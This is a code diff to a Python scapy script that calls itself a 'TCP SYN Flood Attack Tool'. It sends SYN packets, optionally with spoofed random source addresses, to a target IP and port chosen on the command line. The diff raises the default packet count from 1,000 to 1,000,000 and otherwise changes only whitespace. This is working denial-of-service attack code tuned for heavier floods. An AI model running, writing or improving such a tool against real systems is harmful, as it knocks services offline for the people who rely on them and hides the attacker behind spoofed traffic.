@@ -8,7 +8,7 @@ from scapy.all import send
 from scapy.layers.inet import IP, TCP
 from scapy.volatile import RandIP, RandShort
 
-def syn_flood(target_ip, target_port, num_packets=1000, spoof=False):
+def syn_flood(target_ip, target_port, num_packets=1000000, spoof=False):
     """Send TCP SYN packets to target to perform a SYN flood attack"""
     print(f"Starting SYN flood attack on {target_ip}:{target_port}")
     
@@ -23,7 +23,7 @@ def syn_flood(target_ip, target_port, num_packets=1000, spoof=False):
         
         # Create SYN packet
         syn_packet = IP(src=source_ip, dst=target_ip) / \
-                    TCP(sport=source_port, dport=target_port, flags="S")
+                     TCP(sport=source_port, dport=target_port, flags="S")
         
         # Send packet
         send(syn_packet, verbose=0)
@@ -38,11 +38,11 @@ def main():
     parser = argparse.ArgumentParser(description='TCP SYN Flood Attack Tool')
     parser.add_argument('target_ip', help='Target IP address')
     parser.add_argument('target_port', type=int, help='Target port number')
-    parser.add_argument('-c', '--count', type=int, default=1000, 
-                        help='Number of packets to send (default: 1000)')
-    parser.add_argument('-s', '--spoof', action='store_true', 
+    parser.add_argument('-c', '--count', type=int, default=1000000,
+                        help='Number of packets to send (default: 1000000)')
+    parser.add_argument('-s', '--spoof', action='store_true',
                         help='Spoof source IP addresses')
-    parser.add_argument('-t', '--threads', type=int, default=1, 
+    parser.add_argument('-t', '--threads', type=int, default=1,
                         help='Number of threads (default: 1)')
     
     args = parser.parse_args()
